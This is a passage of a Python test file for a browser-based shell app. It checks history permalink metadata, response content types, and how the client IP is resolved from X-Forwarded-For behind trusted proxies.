        finally:
            self._delete_run(run_id)

    def test_html_view_shows_duration(self):
        run_id = "permalink-meta-duration-run"
        self._insert_run_with_meta(
            run_id, "nmap -sV 10.0.0.1", 0,
            "2026-04-10T10:00:00", "2026-04-10T10:01:30",
            ["Nmap done"],
        )
        try:
            body = get_client().get(
                f"/history/{run_id}",
                headers={"X-Session-ID": "test-session"},
            ).get_data(as_text=True)
            assert "1m 30s" in body
        finally:
            self._delete_run(run_id)

    def test_html_view_shows_line_count(self):
        run_id = "permalink-meta-lines-run"
        self._insert_run_with_meta(
            run_id, "dig example.com", 0,
            "2026-04-10T10:00:00", "2026-04-10T10:00:01",
            ["line1", "line2", "line3"],
        )
        try:
            body = get_client().get(
                f"/history/{run_id}",
                headers={"X-Session-ID": "test-session"},
            ).get_data(as_text=True)
            # 3 output lines + 2 injected (prompt-echo + blank) = 5, or just check "lines" present
            assert "lines" in body
        finally:
            self._delete_run(run_id)

    def test_html_view_shows_app_version(self):
        from config import APP_VERSION
        run_id = "permalink-meta-version-run"
        self._insert_run_with_meta(
            run_id, "whoami", 0,
            "2026-04-10T10:00:00", "2026-04-10T10:00:00.1",
        )
        try:
            body = get_client().get(
                f"/history/{run_id}",
                headers={"X-Session-ID": "test-session"},
            ).get_data(as_text=True)
            assert f"v{APP_VERSION}" in body
        finally:
            self._delete_run(run_id)


# ── Response content types ────────────────────────────────────────────────────

class TestContentTypes:
    def test_config_returns_json(self):
        resp = get_client().get("/config")
        assert "application/json" in resp.content_type

    def test_health_returns_json(self):
        resp = get_client().get("/health")
        assert "application/json" in resp.content_type

    def test_faq_returns_json(self):
        resp = get_client().get("/faq")
        assert "application/json" in resp.content_type

    def test_autocomplete_returns_json(self):
        resp = get_client().get("/autocomplete")
        assert "application/json" in resp.content_type

    def test_index_returns_html(self):
        resp = get_client().get("/")
        assert "text/html" in resp.content_type


# ── get_client_ip ─────────────────────────────────────────────────────────────

class TestGetClientIp:
    """get_client_ip() honors X-Forwarded-For only for trusted proxy peers,
    otherwise falls back to the direct connection IP (REMOTE_ADDR)."""

    def setup_method(self, method):  # noqa: ARG002
        self._original_level = shell_app.log.level
        shell_app.log.setLevel(logging.DEBUG)

    def teardown_method(self, method):  # noqa: ARG002
        shell_app.log.setLevel(self._original_level)

    def test_valid_ipv4_in_xff_is_used(self):
        with mock.patch.object(shell_app.log, "debug") as mock_debug:
            get_client().get("/health", headers={"X-Forwarded-For": "1.2.3.4"})
        calls = [c for c in mock_debug.call_args_list if c[0][0] == "REQUEST"]
        assert calls[0].kwargs["extra"]["ip"] == "1.2.3.4"

    def test_valid_ipv6_in_xff_is_used(self):
        with mock.patch.object(shell_app.log, "debug") as mock_debug:
            get_client().get("/health", headers={"X-Forwarded-For": "2001:db8::1"})
        calls = [c for c in mock_debug.call_args_list if c[0][0] == "REQUEST"]
        assert calls[0].kwargs["extra"]["ip"] == "2001:db8::1"

    def test_last_untrusted_ip_used_when_xff_has_multiple_trusted_hops(self):
        original_cidrs = list(shell_app.CFG.get("trusted_proxy_cidrs", []))
        with mock.patch.dict(
            shell_app.CFG,
            {"trusted_proxy_cidrs": original_cidrs + ["10.0.0.0/8"]},
            clear=False,
        ), mock.patch.object(shell_app.log, "debug") as mock_debug:
            get_client().get("/health", headers={"X-Forwarded-For": "5.6.7.8, 10.0.0.1"})
        calls = [c for c in mock_debug.call_args_list if c[0][0] == "REQUEST"]
        assert calls[0].kwargs["extra"]["ip"] == "5.6.7.8"

    def test_untrusted_proxy_logs_proxy_ip_and_falls_back(self):
        with mock.patch.object(shell_app.log, "warning") as mock_warning:
            with shell_app.app.test_request_context(
                "/health",
                environ_base={"REMOTE_ADDR": "203.0.113.10"},
                headers={"X-Forwarded-For": "1.2.3.4"},
            ):
                assert shell_app.get_client_ip() == "203.0.113.10"
        calls = [c for c in mock_warning.call_args_list if c[0][0] == "UNTRUSTED_PROXY"]
        assert calls[0].kwargs["extra"]["proxy_ip"] == "203.0.113.10"
        assert calls[0].kwargs["extra"]["forwarded_for"] == "1.2.3.4"

    def test_no_xff_falls_back_to_remote_addr(self):
        with mock.patch.object(shell_app.log, "debug") as mock_debug:
            get_client(use_forwarded_for=False).get("/health")
        calls = [c for c in mock_debug.call_args_list if c[0][0] == "REQUEST"]
        # Flask test client REMOTE_ADDR is 127.0.0.1
        assert calls[0].kwargs["extra"]["ip"] == "127.0.0.1"

    def test_non_ip_xff_falls_back_to_remote_addr(self):
        with mock.patch.object(shell_app.log, "debug") as mock_debug:
            get_client().get("/health", headers={"X-Forwarded-For": "not-an-ip"})
        calls = [c for c in mock_debug.call_args_list if c[0][0] == "REQUEST"]
        assert calls[0].kwargs["extra"]["ip"] == "127.0.0.1"

    def test_empty_xff_falls_back_to_remote_addr(self):
        with mock.patch.object(shell_app.log, "debug") as mock_debug:
            get_client().get("/health", headers={"X-Forwarded-For": ""})
        calls = [c for c in mock_debug.call_args_list if c[0][0] == "REQUEST"]
        assert calls[0].kwargs["extra"]["ip"] == "127.0.0.1"
